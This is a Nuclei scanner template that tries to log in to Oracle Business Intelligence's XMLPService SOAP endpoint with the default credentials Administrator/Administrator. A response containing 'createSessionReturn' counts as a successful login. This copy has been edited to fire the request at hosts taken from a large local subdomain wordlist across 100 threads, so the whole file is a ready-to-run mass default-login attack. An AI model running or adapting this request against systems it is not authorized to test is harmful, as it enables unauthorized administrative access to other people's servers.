nuclei-v2/O/oracle-business-intelligence-default-credentials.yaml

id: oracle-business-intelligence-default-credentials
info:
  author: milo2012
  name: Oracle Business Intelligence Default Credentials
  severity: high
  tags: oracle,dlogin
requests:
- attack: sniper
  matchers:
  - status:
    - 200
    type: status
  - part: body
    type: word
    words:
    - createSessionReturn
  matchers-condition: and
  payloads:
    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
  raw:
  - "POST /xmlpserver/services/XMLPService HTTP/1.1\nHost: {{Subdomains}}\nContent-Type:\
    \ text/xml\nSOAPAction: \"\"\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n\
    Accept-Encoding: gzip,deflate\nContent-Length: 771\nUser-Agent: Mozilla/5.0 (Windows\
    \ NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0\
    \ Safari/537.36\nConnection: Keep-alive\n\n<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
    \ xmlns:rep=\"http://xmlns.oracle.com/oxp/service/report\">\n   <soapenv:Header/>\n\
    \   <soapenv:Body>\n      <rep:createSession soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"\
    >\n         <username xsi:type=\"xsd:string\">Administrator</username>\n     \
    \    <password xsi:type=\"xsd:string\">Administrator</password>\n         <domain\
    \ xsi:type=\"xsd:string\">bi</domain>\n      </rep:createSession>\n   </soapenv:Body>\n\
    </soapenv:Envelope>\n"
  threads: 100
